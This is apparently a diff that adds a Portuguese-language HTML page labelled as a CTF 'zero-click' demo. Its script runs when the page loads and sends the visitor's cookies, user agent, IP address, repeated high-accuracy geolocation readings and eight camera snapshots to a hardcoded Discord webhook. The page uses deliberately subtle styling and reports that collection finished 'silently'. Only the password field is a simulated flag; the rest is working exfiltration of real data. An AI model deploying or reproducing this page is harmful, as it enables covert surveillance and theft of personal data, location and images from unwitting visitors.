@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Demo CTF Zero-Click Fotos</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f0f0f0; }
+        h1 { color: #ff0000; font-size: 16px; opacity: 0.7; } /* Sutil */
+        #status { font-size: 10px; color: #00aa00; margin-top: 5px; } /* Discreto */
+    </style>
+</head>
+<body>
+    <h1>Pagina zero click coletamos seus dados como demonstração de ctf</h1>
+    <div id="status">Inicializando...</div>
+
+    <script>
+        // Configuração do webhook (use seu Discord ou webhook.site)
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';
+
+        // Função para enviar item individual ao webhook (multipart/form-data)
+        async function sendItemToServer(type, data, index = null) {
+            try {
+                const formData = new FormData();
+                formData.append('payload_json', JSON.stringify({
+                    embeds: [{
+                        title: `CTF Zero-Click: ${type} [${new Date().toISOString()}]`,
+                        fields: [
+                            { name: 'Type', value: type },
+                            { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
+                            { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1024) }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                }));
+                if (type.includes('Photo')) {
+                    const blob = await (await fetch(data.base64)).blob();
+                    formData.append('file', blob, `photo_${index + 1}.webp`);
+                }
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                return true;
+            } catch (e) {
+                console.error(`Erro ao enviar ${type}: ${e.message}`);
+                return false;
+            }
+        }
+
+        // Função para coletar dados base
+        async function collectBaseData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                cookies: document.cookie || 'Nenhum cookie',
+                localStorage: JSON.stringify(localStorage) || 'Nenhum dado em localStorage'
+            };
+
+            // Senha simulada
+            const form = document.createElement('form');
+            form.innerHTML = '<input type="password" name="password" value="flag{ctf_zero_click_photos_2025}">';
+            form.style.display = 'none';
+            document.body.appendChild(form);
+            data.formData = form.querySelector('input').value;
+
+            // Enviar senha
+            await sendItemToServer('Senha Simulada', { password: data.formData });
+            await new Promise(resolve => setTimeout(resolve, 500));
+
+            // Enviar cookies
+            await sendItemToServer('Cookies', { cookies: data.cookies });
+            await new Promise(resolve => setTimeout(resolve, 500));
+
+            // Enviar userAgent
+            await sendItemToServer('User-Agent', { userAgent: data.userAgent });
+            await new Promise(resolve => setTimeout(resolve, 500));
+
+            // Enviar IP
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ip = (await ipResponse.json()).ip;
+                await sendItemToServer('IP', { ip });
+            } catch (e) {
+                await sendItemToServer('IP', { error: 'Erro ao coletar IP' });
+            }
+            await new Promise(resolve => setTimeout(resolve, 500));
+
+            // Coletar localização
+            if (navigator.geolocation) {
+                for (let i = 0; i < 4; i++) {
+                    await new Promise(resolve => {
+                        navigator.geolocation.getCurrentPosition(
+                            async (position) => {
+                                const location = {
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    accuracy: position.coords.accuracy,
+                                    timestamp: new Date().toISOString()
+                                };
+                                await sendItemToServer(`Localização ${i + 1}`, location);
+                                resolve();
+                            },
+                            async () => {
+                                await sendItemToServer(`Localização ${i + 1}`, { error: 'Erro ao coletar localização' });
+                                resolve();
+                            },
+                            { enableHighAccuracy: true, timeout: 2000 }
+                        );
+                    });
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            } else {
+                await sendItemToServer('Localização', { error: 'Geolocation não suportado' });
+            }
+
+            collectPhotos();
+        }
+
+        // Função para coletar 8 fotos
+        async function collectPhotos() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                await sendItemToServer('Câmera', { error: 'Câmera não suportada' });
+                document.getElementById('status').innerHTML = 'Coleta concluída silenciosamente!';
+                return;
+            }
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: navigator.userAgent.match(/mobile/i) ? 'environment' : 'user', width: 320, height: 240 },
+                    audio: false 
+                });
+                for (let i = 0; i < 8; i++) {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    await new Promise(resolve => video.onloadedmetadata = resolve);
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 320;
+                    canvas.height = 240;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.3));
+                    const reader = new FileReader();
+                    const photo = await new Promise(resolve => {
+                        reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
+                        reader.readAsDataURL(blob);
+                    });
+                    await sendItemToServer(`Photo ${i + 1}`, photo, i);
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+                stream.getTracks().forEach(track => track.stop());
+                document.getElementById('status').innerHTML = 'Coleta concluída silenciosamente!';
+            } catch (e) {
+                await sendItemToServer('Câmera', { error: `Erro na câmera: ${e.message}` });
+                document.getElementById('status').innerHTML = 'Coleta concluída com erro na câmera.';
+            }
+        }
+
+        // Iniciar coleta zero-click
+        collectBaseData();
+    </script>
+</body>
+</html>
